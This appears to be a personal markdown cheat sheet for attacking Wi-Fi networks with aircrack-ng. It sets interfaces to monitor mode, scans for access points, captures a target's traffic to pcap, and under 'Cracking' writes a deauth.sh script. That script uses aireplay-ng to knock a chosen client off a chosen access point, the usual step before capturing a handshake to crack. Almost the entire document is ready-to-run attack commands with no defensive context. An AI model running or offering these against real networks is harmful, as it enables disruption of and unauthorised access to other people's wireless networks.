## General

### AP `a`
```bash
1 apdo
2 sta
3 ap+sta
```

### Filter `s`
```bash
10 first seen
12 power rate
```

## Driver
```bash
https://github.com/aircrack-ng/rtl8812au
```

## Settings
```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
```

## Monitor

### Observability - Generic
```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime --band a wlan0
airodump-ng --manufacturer --beacons --showack --wps --uptime --band bg wlan0
```

### Observability - Channel
```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --band abg --bssid CHANGEME wlan1
```

### Target
```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --write-interval 1 --output-format pcap --write CHANGEME \
            --channel CHANGEME --bssid CHANGEME wlan1
```

## Cracking
```bash
cat > deauth.sh << "EndOfMessage"
iwconfig wlan1 channel "${1}"

aireplay-ng -0 99 -D -a "${2}" -c "${3}" wlan1
EndOfMessage

chmod +x deauth.sh
```

## Kill View
```bash
kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
```
